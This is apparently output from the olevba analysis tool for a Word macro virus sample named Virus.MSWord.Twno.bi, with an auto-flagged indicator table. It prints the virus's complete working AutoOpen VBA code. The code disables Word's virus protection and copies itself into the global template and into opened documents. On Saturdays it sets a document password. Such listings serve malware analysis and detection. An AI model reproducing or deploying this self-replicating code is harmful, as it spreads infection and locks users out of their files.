olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Twno.bi
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Twno.bi - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Twno.bi - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
    Dim NeedSave As Boolean
    NeedSave = False
    If (Weekday(Date) = 7) Then
        If Not InStr(LCase(ActiveDocument.BuiltInDocumentProperties("Author").Value), "ÕÅ") > 0 Then
            If ActiveDocument.BuiltInDocumentProperties("Total Editing Time").Value < 20 Then
                    ActiveDocument.Password = "lover"
                    NeedSave = True
            End If
        End If
    End If
    Options.VirusProtection = False
Copy:
    Dim file$
    Dim filem$
    Dim nor1
    Dim kkk
    Dim tt
    WordBasic.DisableInput 1
    
    nor = WordBasic.CountMacros(0)
    If nor > 0 Then
        For kk = 1 To nor
            If WordBasic.[MacroName$](kk, 0) = "AutoOpen" Then
            T = 1
            End If
        Next kk
    End If
    
    file$ = WordBasic.[FileName$]()
    filem$ = file$ + ":AutoOpen"
    If T <> 1 Then
        WordBasic.MacroCopy filem$, "AutoOpen"
        NeedSave = True
    End If
    
    nor1 = WordBasic.CountMacros(1)
    If nor1 > 0 Then
        For kkk = 1 To nor1
            If WordBasic.[MacroName$](kkk, 1) = "AutoOpen" Then
            tt = 1
            End If
            Next kkk
    
    End If
    
    If tt <> 1 Then
        WordBasic.MacroCopy "AutoOpen", filem$
        NeedSave = True
    End If
err:
    On Error GoTo EndSub
    
    If NeedSave Then
        ActiveDocument.SaveAs FileFormat:=1
    End If
EndSub:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

